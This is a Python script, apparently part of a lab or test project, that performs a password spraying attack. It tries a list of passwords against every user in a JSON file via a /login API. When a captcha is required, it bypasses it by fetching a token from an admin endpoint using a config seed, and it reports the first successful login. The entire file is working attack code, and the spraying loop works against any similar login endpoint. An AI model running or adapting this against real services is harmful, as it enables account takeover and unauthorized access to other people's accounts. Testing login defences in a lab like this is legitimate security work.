import argparse
import json
import time
from pathlib import Path
import sys

import requests

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.append(str(ROOT))

from app.config import load_config

CFG = load_config()


def load_users(users_path: Path) -> list[dict]:
    users = json.loads(users_path.read_text())
    return users


def get_captcha_token(base_url: str) -> str | None:
    try:
        resp = requests.get(f"{base_url}/admin/get_captcha_token", params={"group_seed": CFG.group_seed}, timeout=5)
        if resp.status_code == 200:
            return resp.json().get("captcha_token")
    except Exception:
        return None
    return None


def spray(args):
    users = load_users(Path(args.users))
    passwords = [p for p in args.passwords.split(",") if p]
    session = requests.Session()
    total = 0
    start = time.time()
    for pwd in passwords:
        for user in users:
            total += 1
            payload = {"username": user["username"], "password": pwd}
            resp = session.post(f"{args.base}/login", json=payload, timeout=5)
            data = resp.json()
            print(f"[{total}] {user['username']}:{pwd} -> {data.get('result')}")
            if data.get("captcha_required"):
                token = get_captcha_token(args.base)
                if token:
                    payload["captcha_token"] = token
                    resp = session.post(f"{args.base}/login", json=payload, timeout=5)
                    data = resp.json()
                    print(f"  captcha retry -> {data.get('result')}")
            if data.get("result") == "success":
                duration = time.time() - start
                print(f"SUCCESS {user['username']} with {pwd} after {total} attempts in {duration:.2f}s")
                return
    print("No success")


def main():
    parser = argparse.ArgumentParser(description="Password spraying attack")
    parser.add_argument("--users", default="data/users.json", help="path to users json")
    parser.add_argument("--passwords", required=True, help="comma-separated password list to try")
    parser.add_argument("--base", default="http://127.0.0.1:8000", help="API base URL")
    args = parser.parse_args()
    spray(args)


if __name__ == "__main__":
    main()
